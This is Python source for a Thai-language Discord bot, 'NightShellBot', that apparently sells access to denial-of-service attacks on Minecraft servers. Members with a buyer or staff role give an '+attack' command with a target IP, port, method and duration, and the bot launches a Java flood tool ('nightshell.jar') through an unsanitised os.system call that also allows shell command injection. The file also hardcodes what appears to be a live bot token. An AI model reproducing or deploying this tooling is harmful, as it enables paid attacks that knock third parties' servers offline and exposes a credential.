import discord
from discord.ext import commands
from discord.ext.commands import Bot
from discord import Member
import asyncio
import datetime
import random
import os
import threading
import requests
import urllib.request
import json
import asyncio
import sqlite3

token = "ODg1NDYwOTI4Njg1MDMxNDc1.Gxp8so.jJB0etphW32UQYnsUPzmYwDUR59VxW_7zGPlyE" #ใส่ token บอท

client = commands.Bot(command_prefix = '$', help_command=None)

@client.command()
@commands.has_any_role('BUYER', 'OWNER', 'ADMIN', 'MOD')
async def help(ctx):
    embed=discord.Embed(title="หน้าต่างช่วยเหลือ", color=0x1fbae0)
    embed.set_thumbnail(url="https://static1.textcraft.net/data1/9/5/956bde71666aac7e3941f34869104134581ff8b6da39a3ee5e6b4b0d3255bfef95601890afd80709da39a3ee5e6b4b0d3255bfef95601890afd807097db25d633b2224259c59563e9dd3c92d.png")
    embed.add_field(name="+attack", value="+attack <ip> <port> <protocal> <method> <second> เพื่อทำการโจมตี เซิฟเวอร์", inline=False)
    embed.add_field(name="+stop", value="เพื่อหยุดการโจมตี", inline=False)
    embed.add_field(name="+resolve", value="เพื่อเช็ค IP", inline=False)
    embed.set_footer(text="NightShellBot ©2022")
    await ctx.send(embed=embed)



@client.event
async def on_ready():
    print("Logged in BOT")


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.CheckFailure):
        error2 = discord.Embed(title=f":warning: เกิดข้อผิดพลาด", description=f"คุณยังไม่ได้ซื้อ\nMCSTRESSก่อน\n")
        await ctx.channel.send(embed=error2)
    if isinstance(error, commands.errors.MissingRequiredArgument):
        error1 = discord.Embed(title=f":warning: เกิดข้อผิดพลาด", description=f"คำสั่งไม่ถูกต้อง\nโปรดลองใหม่หรือเช็คคำสั่งอีกครั้ง\n")
        await ctx.channel.send(embed=error1)
  
@client.command()
@commands.has_any_role('BUYER', 'OWNER', 'ADMIN', 'MOD')
async def stop(ctx):
    os.system("taskkill /im java.exe /f")
    os.system("killall java")
    embed = discord.Embed(
        title='หยุดการโจมตีแล้ว!',
        description=f'การโจมตีทั้งหมดถูกหยุดแล้ว!!',
        color=discord.Colour.orange()
    )

    await ctx.send(embed=embed)
    
    
@client.command()
@commands.has_any_role('BUYER', 'OWNER', 'ADMIN', 'MOD')
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="**เช็คไอพีทั้งหมดแล้ว!**",
        color=discord.Colour.red()
    )

    embed.add_field(name='``Ip:``', value=json_object["ip"], inline=True)
    embed.add_field(name='``Port:``', value=json_object["port"], inline=True)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_thumbnail(url=f'https://api.mcsrvstat.us/icon/{arg1}')
    embed.set_image(url=f'http://status.mclive.eu/NightShellBot/{g}/{gb}/banner.png')
    embed.set_footer(text="NightShellBot ©2022 Create By Thanawat#1097") #ห้ามแก้ Create By Thanawat#1097
    await ctx.send(embed=embed)

@client.command()
@commands.has_any_role('BUYER', 'OWNER', 'ADMIN', 'MOD')
async def attack(ctx, arg1, arg2, arg3, arg4, arg5):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar nightshell.jar {arg1}:{arg2} {arg3} {arg4} {arg5} -1")
        os.system(f"")

    embed = discord.Embed(
        title='เริ่มการโจมตี!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}:{arg2}', inline=False)
    embed.add_field(name='protocal:', value=f'{arg3}', inline=False)
    embed.add_field(name='method:', value=f'{arg4}', inline=False)
    embed.add_field(name='seconrd:', value=f'{arg5}', inline=False)
    embed.set_thumbnail(url=f'https://api.mcsrvstat.us/icon/{arg1}')
    embed.set_image(url=f'http://status.mclive.eu/NightShellBot/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="NightShellBot ©2022 Create By Thanawat#1097") #ห้ามแก้ Create By Thanawat#1097

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)
	
	
client.run(token)
